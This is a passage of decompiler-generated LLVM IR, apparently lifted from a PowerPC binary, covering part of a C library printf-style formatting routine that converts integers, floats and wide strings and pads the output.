dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge.dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge_crit_edge: ; preds = %dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge
  %v1_100088c8.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge

dec_label_pc_100088dc:                            ; preds = %dec_label_pc_100088c8.preheader, %dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge, %dec_label_pc_100088d0.preheader.thread, %dec_label_pc_100088d0.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_100088e0, label %dec_label_pc_100088e8, label %dec_label_pc_10008908

dec_label_pc_100088e8:                            ; preds = %dec_label_pc_100088dc
  %v0_100088ec = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_100088ec, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_100088ec, 0
  %v1_100088f4 = zext i1 %tmp96 to i32
  %v2_100088f4 = ashr i32 %v0_100088ec, 31
  %v3_100088f4 = and i32 %v2_100088f4, -2
  %v4_100088f4 = or i32 %v3_100088f4, %v1_100088f4
  store i32 %v4_100088f4, i32* @r5, align 4
  %v1_100088fc = call i32 @__asm_rlwinm(i32 %v0_10008a1c, i32 0, i32 20, i32 23)
  store i32 %v1_100088fc, i32* @r4, align 4
  %v1_10008900 = inttoptr i32 %v1_100088fc to i16*
  %v2_10008900 = call i32 @_store_inttype(i16* %v1_10008900)
  br label %dec_label_pc_10008dc4

dec_label_pc_10008908:                            ; preds = %dec_label_pc_100088dc
  br i1 %v2_10008908, label %dec_label_pc_10008ae8, label %dec_label_pc_10008910

dec_label_pc_10008910:                            ; preds = %dec_label_pc_10008908
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_10008920 = load i8, i8* %v2_10008920, align 1
  %v4_10008920 = zext i8 %v3_10008920 to i32
  store i32 %v4_10008920, i32* %r30.global-to-local, align 4
  %v3_10008924 = icmp eq i8 %v3_10008920, 10
  br i1 %v3_10008924, label %dec_label_pc_1000892c, label %dec_label_pc_10008954

dec_label_pc_1000892c:                            ; preds = %dec_label_pc_10008910
  store i32 %v0_10008a1c, i32* %r0.global-to-local, align 4
  %v1_10008930 = call i32 @__asm_rlwinm(i32 %v0_10008a1c, i32 26, i32 31, i32 31)
  %v1_10008934 = call i32 @__asm_rlwinm(i32 %v0_10008a1c, i32 27, i32 31, i32 31)
  %v3_10008938 = icmp eq i32 %v1_10008930, 0
  %v2_1000893c = icmp ne i32 %v1_10008934, 0
  %not.v2_1000893c = xor i1 %v2_1000893c, true
  %v6_10008940 = sext i1 %not.v2_1000893c to i32
  store i32 %v6_10008940, i32* %r0.global-to-local, align 4
  %v1_10008948 = select i1 %v2_1000893c, i32 44, i32 87
  store i32 %v1_10008948, i32* %r31.global-to-local, align 4
  br i1 %v3_10008938, label %dec_label_pc_10008954, label %dec_label_pc_10008950

dec_label_pc_10008950:                            ; preds = %dec_label_pc_1000892c
  %v1_10008950 = or i32 %v1_10008948, 128
  store i32 %v1_10008950, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008954

dec_label_pc_10008954:                            ; preds = %dec_label_pc_10008910, %dec_label_pc_1000892c, %dec_label_pc_10008950
  %v0_10008954 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008954 = icmp ugt i32 %v0_10008954, 5
  br i1 %v2_10008954, label %dec_label_pc_1000897c, label %dec_label_pc_1000895c

dec_label_pc_1000895c:                            ; preds = %dec_label_pc_10008954
  %v3_1000895c = icmp eq i32 %v0_10008954, 3
  br i1 %v3_1000895c, label %dec_label_pc_10008964, label %dec_label_pc_1000896c

dec_label_pc_10008964:                            ; preds = %dec_label_pc_1000895c
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008980

dec_label_pc_1000896c:                            ; preds = %dec_label_pc_1000895c
  %v3_1000896c = icmp eq i32 %v0_10008954, 1
  br i1 %v3_1000896c, label %dec_label_pc_10008984, label %dec_label_pc_10008980

dec_label_pc_1000897c:                            ; preds = %dec_label_pc_10008954
  %v0_1000897c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000897c = sub i32 0, %v0_1000897c
  store i32 %v1_1000897c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008980

dec_label_pc_10008980:                            ; preds = %dec_label_pc_1000896c, %dec_label_pc_10008964, %dec_label_pc_1000897c
  br label %dec_label_pc_10008984

dec_label_pc_10008984:                            ; preds = %dec_label_pc_1000896c, %dec_label_pc_10008980
  %storemerge3 = phi i32 [ 11, %dec_label_pc_10008980 ], [ 6, %dec_label_pc_1000896c ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_10008984 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10008984, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_10008984, -1
  br i1 %tmp75, label %dec_label_pc_10008998, label %dec_label_pc_10008994

dec_label_pc_10008994:                            ; preds = %dec_label_pc_10008984
  br label %dec_label_pc_10008998

dec_label_pc_10008998:                            ; preds = %dec_label_pc_10008984, %dec_label_pc_10008994
  %storemerge = phi i32 [ %v4_10008994, %dec_label_pc_10008994 ], [ 32, %dec_label_pc_10008984 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_10008998 = icmp eq i32 %v0_10008954, 1
  br i1 %v3_10008998, label %dec_label_pc_100089b4, label %dec_label_pc_100089a4

dec_label_pc_100089a4:                            ; preds = %dec_label_pc_10008998
  %v0_100089a4 = load i32, i32* @r7, align 4
  %v1_100089a4 = mul i32 %v0_100089a4, 4
  store i32 %v1_100089a4, i32* %r0.global-to-local, align 4
  %v0_100089a8 = load i32, i32* @r1, align 4
  %v2_100089a8 = add i32 %v0_100089a8, %v1_100089a4
  %v1_100089ac = add i32 %v2_100089a8, 188
  %v2_100089ac = inttoptr i32 %v1_100089ac to i32*
  %v3_100089ac = load i32, i32* %v2_100089ac, align 4
  store i32 %v3_100089ac, i32* %r0.global-to-local, align 4
  %v1_100089b0 = call i32 @__asm_rlwinm(i32 %v3_100089ac, i32 0, i32 20, i32 23)
  br label %dec_label_pc_100089b4

dec_label_pc_100089b4:                            ; preds = %dec_label_pc_10008998, %dec_label_pc_100089a4
  %v3_100089b4 = load i32, i32* %stack_var_-344, align 4
  %v0_100089b8 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100089b8, i32* @r5, align 4
  %v2_100089bc = inttoptr i32 %v0_100089b8 to i32*
  %v3_100089bc = call i32 @_load_inttype(i32 %v3_100089b4, i32* %v2_100089bc)
  %v0_100089cc = load i32, i32* %r31.global-to-local, align 4
  %v6_100089d4 = call i32 @_uintmaxtostr(i8* %v5_100089d4, i32 %v3_100089bc, i32 %v3_100089b4, i32 %v0_100089b8, i32 %v0_100089cc)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_100089d4, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_10008a28, label %dec_label_pc_100089e8

dec_label_pc_100089e8:                            ; preds = %dec_label_pc_100089b4
  %v7_100089d4 = inttoptr i32 %v6_100089d4 to i8*
  %v3_100089e8 = load i8, i8* %v7_100089d4, align 1
  %v4_100089e8 = zext i8 %v3_100089e8 to i32
  store i32 %v4_100089e8, i32* %r0.global-to-local, align 4
  %v3_100089f0 = icmp eq i8 %v3_100089e8, 45
  br i1 %v3_100089f0, label %dec_label_pc_100089f8, label %dec_label_pc_10008a0c

dec_label_pc_100089f8:                            ; preds = %dec_label_pc_100089e8
  %v1_100089f8 = or i32 %v0_10008a1c, 2
  store i32 %v1_100089f8, i32* %r0.global-to-local, align 4
  %v2_100089fc = add i32 %v6_100089d4, 1
  store i32 %v2_100089fc, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_10008a28

dec_label_pc_10008a0c:                            ; preds = %dec_label_pc_100089e8
  %v1_10008a0c = and i32 %v0_10008a1c, 2
  store i32 %v1_10008a0c, i32* %r0.global-to-local, align 4
  %v3_10008a0c = icmp eq i32 %v1_10008a0c, 0
  br i1 %v3_10008a0c, label %dec_label_pc_10008a1c, label %dec_label_pc_10008a14

dec_label_pc_10008a14:                            ; preds = %dec_label_pc_10008a0c
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10008a28

dec_label_pc_10008a1c:                            ; preds = %dec_label_pc_10008a0c
  %v1_10008a1c = urem i32 %v0_10008a1c, 2
  store i32 %v1_10008a1c, i32* %r11.global-to-local, align 4
  %v3_10008a1c = icmp eq i32 %v1_10008a1c, 0
  br i1 %v3_10008a1c, label %dec_label_pc_10008a28, label %dec_label_pc_10008a24

dec_label_pc_10008a24:                            ; preds = %dec_label_pc_10008a1c
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_10008a28

dec_label_pc_10008a28:                            ; preds = %dec_label_pc_10008a1c, %dec_label_pc_100089b4, %dec_label_pc_10008a14, %dec_label_pc_100089f8, %dec_label_pc_10008a24
  %v0_10008a94 = phi i32 [ %v6_100089d4, %dec_label_pc_100089b4 ], [ %v2_100089fc, %dec_label_pc_100089f8 ], [ %v6_100089d4, %dec_label_pc_10008a1c ], [ %v6_100089d4, %dec_label_pc_10008a24 ], [ %v6_100089d4, %dec_label_pc_10008a14 ]
  %stack_var_-184.0 = phi i32 [ %v0_10008a1c, %dec_label_pc_100089b4 ], [ %v1_100089f8, %dec_label_pc_100089f8 ], [ %v0_10008a1c, %dec_label_pc_10008a1c ], [ %v0_10008a1c, %dec_label_pc_10008a24 ], [ %v0_10008a1c, %dec_label_pc_10008a14 ]
  %v3_10008a28 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_10008c3c, i32* %r0.global-to-local, align 4
  %v2_10008a30 = sub i32 %v2_10008c3c, %v0_10008a94
  %v1_10008a38 = add i32 %v2_10008a30, 127
  store i32 %v1_10008a38, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_10008a28, -1
  br i1 %tmp76, label %dec_label_pc_10008a44, label %dec_label_pc_10008a40

dec_label_pc_10008a40:                            ; preds = %dec_label_pc_10008a28
  br label %dec_label_pc_10008a44

dec_label_pc_10008a44:                            ; preds = %dec_label_pc_10008a28, %dec_label_pc_10008a40
  %v0_10008a78 = phi i32 [ %v3_10008a28, %dec_label_pc_10008a28 ], [ 1, %dec_label_pc_10008a40 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_10008a48 = and i32 %stack_var_-184.0, 16
  store i32 %v1_10008a48, i32* %r11.global-to-local, align 4
  %v3_10008a48 = icmp eq i32 %v1_10008a48, 0
  br i1 %v3_10008a48, label %dec_label_pc_10008a94, label %dec_label_pc_10008a50

dec_label_pc_10008a50:                            ; preds = %dec_label_pc_10008a44
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_10008a54, label %dec_label_pc_10008a60, label %dec_label_pc_10008a70.thread

dec_label_pc_10008a70.thread:                     ; preds = %dec_label_pc_10008a50
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_10008a94

dec_label_pc_10008a60:                            ; preds = %dec_label_pc_10008a50
  br i1 %v3_10008a60, label %dec_label_pc_10008a68, label %dec_label_pc_10008a70

dec_label_pc_10008a68:                            ; preds = %dec_label_pc_10008a60
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_10008a94

dec_label_pc_10008a70:                            ; preds = %dec_label_pc_10008a60
  br i1 %v3_10008a70, label %dec_label_pc_10008a78, label %dec_label_pc_10008a94

dec_label_pc_10008a78:                            ; preds = %dec_label_pc_10008a70
  %v3_10008a78 = icmp ugt i32 %v0_10008a78, %v1_10008a38
  br i1 %v3_10008a78, label %dec_label_pc_10008a94, label %dec_label_pc_10008a80

dec_label_pc_10008a80:                            ; preds = %dec_label_pc_10008a78
  %v1_10008a80 = inttoptr i32 %v0_10008a94 to i8*
  %v2_10008a80 = load i8, i8* %v1_10008a80, align 1
  %v3_10008a80 = zext i8 %v2_10008a80 to i32
  store i32 %v3_10008a80, i32* %r0.global-to-local, align 4
  %v3_10008a88 = icmp eq i8 %v2_10008a80, 48
  br i1 %v3_10008a88, label %dec_label_pc_10008a94, label %dec_label_pc_10008a90

dec_label_pc_10008a90:                            ; preds = %dec_label_pc_10008a80
  %v1_10008a90 = add i32 %v2_10008a30, 128
  br label %dec_label_pc_10008a94

dec_label_pc_10008a94:                            ; preds = %dec_label_pc_10008a70.thread, %dec_label_pc_10008a70, %dec_label_pc_10008a80, %dec_label_pc_10008a78, %dec_label_pc_10008a44, %dec_label_pc_10008a68, %dec_label_pc_10008a90
  %v1_10008adc = phi i32 [ %v0_10008a78, %dec_label_pc_10008a70 ], [ 1, %dec_label_pc_10008a80 ], [ %v0_10008a78, %dec_label_pc_10008a78 ], [ %v0_10008a78, %dec_label_pc_10008a44 ], [ %v0_10008a78, %dec_label_pc_10008a68 ], [ %v1_10008a90, %dec_label_pc_10008a90 ], [ %v0_10008a78, %dec_label_pc_10008a70.thread ]
  %v1_10008a94 = inttoptr i32 %v0_10008a94 to i8*
  %v2_10008a94 = load i8, i8* %v1_10008a94, align 1
  %v3_10008a94 = zext i8 %v2_10008a94 to i32
  store i32 %v3_10008a94, i32* %r0.global-to-local, align 4
  %v3_10008a98 = icmp eq i8 %v2_10008a94, 48
  br i1 %v3_10008a98, label %dec_label_pc_10008aa0, label %dec_label_pc_10008ad8

dec_label_pc_10008aa0:                            ; preds = %dec_label_pc_10008a94
  %v0_10008aa0 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_10008aa0, 6
  br i1 %tmp77, label %dec_label_pc_10008aac, label %dec_label_pc_10008aa8

dec_label_pc_10008aa8:                            ; preds = %dec_label_pc_10008aa0
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_10008aac

dec_label_pc_10008aac:                            ; preds = %dec_label_pc_10008aa0, %dec_label_pc_10008aa8
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_10008ab0, label %dec_label_pc_10008ab8, label %dec_label_pc_10008ac8

dec_label_pc_10008ab8:                            ; preds = %dec_label_pc_10008aac
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_100128e0.577 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008c54

dec_label_pc_10008ac8:                            ; preds = %dec_label_pc_10008aac
  %v3_10008ac8 = icmp eq i32 %v1_10008adc, 0
  br i1 %v3_10008ac8, label %dec_label_pc_10008ad0, label %dec_label_pc_10008ad8

dec_label_pc_10008ad0:                            ; preds = %dec_label_pc_10008ac8
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008c54

dec_label_pc_10008ad8:                            ; preds = %dec_label_pc_10008ac8, %dec_label_pc_10008a94
  %v3_10008ad8 = icmp ugt i32 %v1_10008adc, %v1_10008a38
  %v2_10008adc = sub i32 %v1_10008adc, %v1_10008a38
  store i32 %v2_10008adc, i32* %r29.global-to-local, align 4
  br i1 %v3_10008ad8, label %dec_label_pc_10008c74thread-pre-split, label %dec_label_pc_10008c54

dec_label_pc_10008ae8:                            ; preds = %dec_label_pc_10008908
  br i1 %v2_10008ae8, label %dec_label_pc_10008b1c, label %dec_label_pc_10008af0

dec_label_pc_10008af0:                            ; preds = %dec_label_pc_10008ae8
  %v3_10008af0 = load i32, i32* %stack_var_-344, align 4
  %v0_10008afc = load i32, i32* %r24.global-to-local, align 4
  store i32 268471052, i32* @lr, align 4
  %v5_10008b08 = call i32 @_fpmaxtostr(i32 %v0_10008afc, i32* nonnull %stack_var_-196, i32 add (i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32 -31004), i32 %v3_10008af0)
  %v1_10008b0c = icmp slt i32 %v5_10008b08, 0
  br i1 %v1_10008b0c, label %dec_label_pc_10008dd8, label %dec_label_pc_10008b14

dec_label_pc_10008b14:                            ; preds = %dec_label_pc_10008af0
  %v0_10008b14 = load i32, i32* %r23.global-to-local, align 4
  %v2_10008b14 = add i32 %v0_10008b14, %v5_10008b08
  store i32 %v2_10008b14, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10008dc4

dec_label_pc_10008b1c:                            ; preds = %dec_label_pc_10008ae8
  br i1 %v2_10008b1c, label %dec_label_pc_10008bc4, label %dec_label_pc_10008b24

dec_label_pc_10008b24:                            ; preds = %dec_label_pc_10008b1c
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_10008b30 = load i32, i32* %stack_var_-344, align 4
  %v1_10008b38 = inttoptr i32 %v3_10008b30 to i32*
  %v2_10008b38 = load i32, i32* %v1_10008b38, align 4
  br i1 %v3_10008b1c, label %dec_label_pc_10008b38, label %dec_label_pc_10008b8c

dec_label_pc_10008b38:                            ; preds = %dec_label_pc_10008b24
  store i32 %v2_10008b38, i32* %r0.global-to-local, align 4
  %v3_10008b3c = icmp eq i32 %v2_10008b38, 0
  store i32 %v2_10008b38, i32* %stack_var_-340, align 4
  br i1 %v3_10008b3c, label %dec_label_pc_10008c5c, label %dec_label_pc_10008b48

dec_label_pc_10008b48:                            ; preds = %dec_label_pc_10008b38
  %v3_10008b48 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10008b48, i32* %r0.global-to-local, align 4
  %v1_10008b50 = icmp slt i32 %v3_10008b48, 0
  br i1 %v1_10008b50, label %dec_label_pc_10008b5c, label %dec_label_pc_10008b58

dec_label_pc_10008b58:                            ; preds = %dec_label_pc_10008b48
  br label %dec_label_pc_10008b5c

dec_label_pc_10008b5c:                            ; preds = %dec_label_pc_10008b48, %dec_label_pc_10008b58
  %storemerge94 = phi i32 [ %v3_10008b48, %dec_label_pc_10008b58 ], [ -1, %dec_label_pc_10008b48 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_10008b5c, i32* @r3, align 4
  store i32 %v2_10008b60, i32* @r6, align 4
  store i32 %v2_10008b5c, i32* @r4, align 4
  store i32 268471148, i32* @lr, align 4
  %v0_10008b68 = call i32 @__GI_wcsrtombs()
  %v3_10008b6c = icmp eq i32 %v0_10008b68, -1
  store i32 %v0_10008b68, i32* @r31, align 4
  br i1 %v3_10008b6c, label %dec_label_pc_10008dd8, label %dec_label_pc_10008b78

dec_label_pc_10008b78:                            ; preds = %dec_label_pc_10008b5c
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008c74

dec_label_pc_10008b8c:                            ; preds = %dec_label_pc_10008b24
  store i32 %v2_10008c3c, i32* @r28, align 4
  store i32 268471200, i32* @lr, align 4
  %v3_10008b9c = call i32 @__GI_wcrtomb(i32 %v2_10008c3c, i32 %v2_10008b38, i32 %v2_10008b60)
  %v3_10008ba0 = icmp eq i32 %v3_10008b9c, -1
  store i32 %v3_10008b9c, i32* @r31, align 4
  br i1 %v3_10008ba0, label %dec_label_pc_10008dd8, label %dec_label_pc_10008bac

dec_label_pc_10008bac:                            ; preds = %dec_label_pc_10008b8c
  store i32 %v2_10008c3c, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_10008bbc = load i32, i32* @r25, align 4
  %v1_10008bbc = load i32, i32* @r28, align 4
  %v3_10008bbc = trunc i32 %v0_10008bbc to i8
  %v4_10008bbc = add i32 %v1_10008bbc, %v3_10008b9c
  %v5_10008bbc = inttoptr i32 %v4_10008bbc to i8*
  store i8 %v3_10008bbc, i8* %v5_10008bbc, align 1
  %v0_10008c78.pre.pre = load i32, i32* @r31, align 4
  %v1_10008c78.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008c74thread-pre-split

dec_label_pc_10008bc4:                            ; preds = %dec_label_pc_10008b1c
  br i1 %v2_10008bc4, label %dec_label_pc_10008c30, label %dec_label_pc_10008bcc

dec_label_pc_10008bcc:                            ; preds = %dec_label_pc_10008bc4
  %v3_10008bd0 = load i32, i32* %stack_var_-344, align 4
  %v1_10008bd8 = inttoptr i32 %v3_10008bd0 to i32*
  %v2_10008bd8 = load i32, i32* %v1_10008bd8, align 4
  br i1 %v3_10008bc4, label %dec_label_pc_10008bd8, label %dec_label_pc_10008c08

dec_label_pc_10008bd8:                            ; preds = %dec_label_pc_10008bcc
  store i32 %v2_10008bd8, i32* %r30.global-to-local, align 4
  %v3_10008bdc = icmp eq i32 %v2_10008bd8, 0
  br i1 %v3_10008bdc, label %dec_label_pc_10008c5c, label %dec_label_pc_10008be4

dec_label_pc_10008be4:                            ; preds = %dec_label_pc_10008bd8, %dec_label_pc_10008c38
  %v0_10008bf8 = phi i32 [ %v2_10008bd8, %dec_label_pc_10008bd8 ], [ %v3_10008c48, %dec_label_pc_10008c38 ]
  %v3_10008be4 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10008be4, i32* %r0.global-to-local, align 4
  %v1_10008bec = icmp slt i32 %v3_10008be4, 0
  br i1 %v1_10008bec, label %dec_label_pc_10008bf8, label %dec_label_pc_10008bf4

dec_label_pc_10008bf4:                            ; preds = %dec_label_pc_10008be4
  br label %dec_label_pc_10008bf8

dec_label_pc_10008bf8:                            ; preds = %dec_label_pc_10008be4, %dec_label_pc_10008bf4
  %storemerge95 = phi i32 [ %v3_10008be4, %dec_label_pc_10008bf4 ], [ -1, %dec_label_pc_10008be4 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268471296, i32* @lr, align 4
  %v1_10008bfc = inttoptr i32 %v0_10008bf8 to i8*
  %v2_10008bfc = call i32 @strnlen(i8* %v1_10008bfc)
  store i32 %v2_10008bfc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008c68

dec_label_pc_10008c08:                            ; preds = %dec_label_pc_10008bcc
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_10008bd8, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_10008c3c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008c74thread-pre-split

dec_label_pc_10008c30:                            ; preds = %dec_label_pc_10008bc4
  br i1 %v3_10008c30, label %dec_label_pc_10008c38, label %dec_label_pc_10008dd8

dec_label_pc_10008c38:                            ; preds = %dec_label_pc_10008c30
  %v0_10008c38 = call i32 @__errno_location()
  %v1_10008c40 = inttoptr i32 %v0_10008c38 to i32*
  %v2_10008c40 = load i32, i32* %v1_10008c40, align 4
  store i32 %v2_10008c40, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268471372, i32* @lr, align 4
  %v3_10008c48 = call i32 @__GI___glibc_strerror_r(i32 %v2_10008c40, i32 %v2_10008c3c, i32 128)
  store i32 %v3_10008c48, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008be4

dec_label_pc_10008c54:                            ; preds = %dec_label_pc_10008ad8, %dec_label_pc_10008ad0, %dec_label_pc_10008ab8
  %v0_10008c78.pre41 = phi i32 [ %v1_10008a38, %dec_label_pc_10008ad8 ], [ 0, %dec_label_pc_10008ad0 ], [ 5, %dec_label_pc_10008ab8 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008c74thread-pre-split

dec_label_pc_10008c5c:                            ; preds = %dec_label_pc_10008bd8, %dec_label_pc_10008b38
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_100128e8.578 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008c68

dec_label_pc_10008c68:                            ; preds = %dec_label_pc_10008bf8, %dec_label_pc_10008c5c
  %v0_10008c7829 = phi i32 [ %v2_10008bfc, %dec_label_pc_10008bf8 ], [ 6, %dec_label_pc_10008c5c ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_10008c74

dec_label_pc_10008c74thread-pre-split:            ; preds = %dec_label_pc_10008bac, %dec_label_pc_10008c08, %dec_label_pc_10008c54, %dec_label_pc_10008ad8
  %v1_10008c78.pre = phi i32 [ %v2_10008adc, %dec_label_pc_10008ad8 ], [ 0, %dec_label_pc_10008c54 ], [ %v1_10008c78.pre.pre, %dec_label_pc_10008bac ], [ 0, %dec_label_pc_10008c08 ]
  %v0_10008c78.pre = phi i32 [ %v1_10008a38, %dec_label_pc_10008ad8 ], [ %v0_10008c78.pre41, %dec_label_pc_10008c54 ], [ %v0_10008c78.pre.pre, %dec_label_pc_10008bac ], [ 1, %dec_label_pc_10008c08 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_10008ad8 ], [ %stack_var_-184.0, %dec_label_pc_10008c54 ], [ %v0_10008a1c, %dec_label_pc_10008bac ], [ %v0_10008a1c, %dec_label_pc_10008c08 ]
  %v0_10008c74.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_10008c74

dec_label_pc_10008c74:                            ; preds = %dec_label_pc_10008c74thread-pre-split, %dec_label_pc_10008b78, %dec_label_pc_10008c68
  %v1_10008c78 = phi i32 [ %v1_10008c78.pre, %dec_label_pc_10008c74thread-pre-split ], [ 0, %dec_label_pc_10008b78 ], [ 0, %dec_label_pc_10008c68 ]
  %v0_10008c78 = phi i32 [ %v0_10008c78.pre, %dec_label_pc_10008c74thread-pre-split ], [ %v0_10008b68, %dec_label_pc_10008b78 ], [ %v0_10008c7829, %dec_label_pc_10008c68 ]
  %v0_10008c80 = phi i32 [ %v0_10008c74.pr, %dec_label_pc_10008c74thread-pre-split ], [ 11, %dec_label_pc_10008b78 ], [ 11, %dec_label_pc_10008c68 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_10008c74thread-pre-split ], [ %v0_10008a1c, %dec_label_pc_10008b78 ], [ %v0_10008a1c, %dec_label_pc_10008c68 ]
  %v3_10008c74 = icmp eq i32 %v0_10008c80, 11
  %v2_10008c78 = add i32 %v0_10008c78, %v1_10008c78
  store i32 %v2_10008c78, i32* %r0.global-to-local, align 4
  br i1 %v3_10008c74, label %dec_label_pc_10008c94, label %dec_label_pc_10008c80

dec_label_pc_10008c80:                            ; preds = %dec_label_pc_10008c74
  %v0_10008c84 = call i32 @__asm_mfcr()
  %v1_10008c88 = call i32 @__asm_rlwinm(i32 %v0_10008c84, i32 30, i32 31, i32 31)
  %v1_10008c8c = add i32 %v1_10008c88, 1
  %v0_10008c90 = load i32, i32* %r0.global-to-local, align 4
  %v2_10008c90 = add i32 %v0_10008c90, %v1_10008c8c
  store i32 %v2_10008c90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008c94

dec_label_pc_10008c94:                            ; preds = %dec_label_pc_10008c74, %dec_label_pc_10008c80
  %v0_10008cac = phi i32 [ %v2_10008c78, %dec_label_pc_10008c74 ], [ %v2_10008c90, %dec_label_pc_10008c80 ]
  %v3_10008c9c = icmp ugt i32 %tmp, %v0_10008cac
  br i1 %v3_10008c9c, label %dec_label_pc_10008ca4, label %dec_label_pc_10008ca8

dec_label_pc_10008ca4:                            ; preds = %dec_label_pc_10008c94
  %v2_10008ca4 = sub i32 %tmp, %v0_10008cac
  br label %dec_label_pc_10008ca8

dec_label_pc_10008ca8:                            ; preds = %dec_label_pc_10008c94, %dec_label_pc_10008ca4
  %storemerge93 = phi i32 [ %v2_10008ca4, %dec_label_pc_10008ca4 ], [ 0, %dec_label_pc_10008c94 ]
  %v1_10008cb8 = phi i32 [ %v2_10008ca4, %dec_label_pc_10008ca4 ], [ 0, %dec_label_pc_10008c94 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_10008ca8 = load i32, i32* @r26, align 4
  %v3_10008ca8 = icmp eq i32 %v0_10008ca8, 48
  %v2_10008cac = add i32 %v1_10008cb8, %v0_10008cac
  store i32 %v2_10008cac, i32* %r0.global-to-local, align 4
  %v0_10008cb0 = load i32, i32* %r23.global-to-local, align 4
  %v2_10008cb0 = add i32 %v0_10008cb0, %v2_10008cac
  store i32 %v2_10008cb0, i32* %r23.global-to-local, align 4
  br i1 %v3_10008ca8, label %dec_label_pc_10008cb8, label %dec_label_pc_10008cc0

dec_label_pc_10008cb8:                            ; preds = %dec_label_pc_10008ca8
  %v0_10008cb8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10008cb8 = add i32 %v0_10008cb8, %v1_10008cb8
  store i32 %v2_10008cb8, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10008cc0

dec_label_pc_10008cc0:                            ; preds = %dec_label_pc_10008ca8, %dec_label_pc_10008cb8
  %v0_10008cd4 = phi i32 [ %v1_10008cb8, %dec_label_pc_10008ca8 ], [ 0, %dec_label_pc_10008cb8 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_10008cc4 = and i32 %stack_var_-184.1, 8
  %v3_10008cc4 = icmp eq i32 %v1_10008cc4, 0
  br i1 %v3_10008cc4, label %dec_label_pc_10008ccc, label %dec_label_pc_10008ce8

dec_label_pc_10008ccc:                            ; preds = %dec_label_pc_10008cc0
  %v0_10008ccc = load i32, i32* %r24.global-to-local, align 4
  store i32 268471516, i32* @lr, align 4
  %v4_10008cd8 = call i32 @_charpad(i32 %v0_10008ccc, i8 32, i32 %v0_10008cd4)
  %v1_10008cdc = load i32, i32* @r28, align 4
  %v4_10008cdc = icmp eq i32 %v4_10008cd8, %v1_10008cdc
  br i1 %v4_10008cdc, label %dec_label_pc_10008ce4, label %dec_label_pc_10008dd8

